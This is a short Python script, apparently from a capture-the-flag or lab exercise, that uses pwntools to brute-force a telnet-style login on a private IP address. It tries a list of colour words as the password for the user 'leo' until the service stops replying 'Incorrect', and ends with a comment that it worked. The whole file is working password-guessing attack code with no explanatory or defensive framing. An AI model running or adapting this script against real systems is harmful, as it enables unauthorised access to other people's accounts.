from pwn import *
import warnings

context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")


ip = '192.168.232.159'
port = 23

colour = ['blue', 'yellow', 'green', 'indigo', 'white', 'black', 'red', 'orange', 'purple']

for c in colour:
    io = remote(ip, port)
    val = f"{c}"
    io.sendline('leo')
    io.sendline(val)
    response = io.recvall().decode()
    if 'Incorrect' in response:
        io.close()
    else:
        break
        
  
# Doesn't work as i expected but at least it worked \o/
